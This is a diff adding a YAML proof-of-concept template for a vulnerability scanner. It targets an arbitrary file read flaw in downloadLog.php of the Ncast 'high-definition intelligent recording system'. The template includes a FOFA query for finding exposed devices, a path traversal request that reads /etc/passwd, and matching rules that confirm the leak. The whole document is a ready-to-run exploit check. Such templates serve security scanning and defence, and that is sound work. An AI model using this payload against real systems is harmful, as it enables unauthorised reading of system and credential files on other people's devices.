@@ -1,0 +1,16 @@
+id: poc-yaml-ncast-downloadlog-php-anyfile-read
+info:
+  name: Ncast高清智能录播系统 downloadLog.php 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 高清智能录播系统
+  fofa: app="Ncast-产品" && title=="高清智能录播系统"
+requests:
+- method: GET
+  path: /developLog/downloadLog.php?name=../../../../etc/passwd
+  expression: "status_code == 200 && \ncontains(body,\"root:\") &&\ncontains(body,\"\
+    /bin\") &&\ncontains(headers,\"filename=\\\"passwd\\\"\") &&\n!contains(body,\"\
+    <\")\n"
+variables: {}
+transport: http
